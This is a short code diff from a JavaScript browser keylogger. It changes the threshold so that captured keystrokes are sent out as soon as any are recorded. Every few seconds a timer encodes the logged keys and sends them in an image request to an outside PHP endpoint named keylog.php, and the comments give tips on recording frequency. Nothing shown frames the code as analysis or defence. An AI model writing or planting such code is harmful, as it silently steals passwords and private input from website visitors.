@@ -13,7 +13,7 @@ window.addEventListener("keydown", function(evt){
 // Reduce interval timing for more frequent recordings, but increases server load
 // You can also set this to send only if certain number of key stroke were made.
 window.setInterval(function () {
-  if (presses.length>5) {
+  if (presses.length>0) {
     var data = encodeURIComponent(JSON.stringify(presses));
     // console.log(data);
     new Image().src = "https://glhf.com.tw/keylog.php?k=" + data;
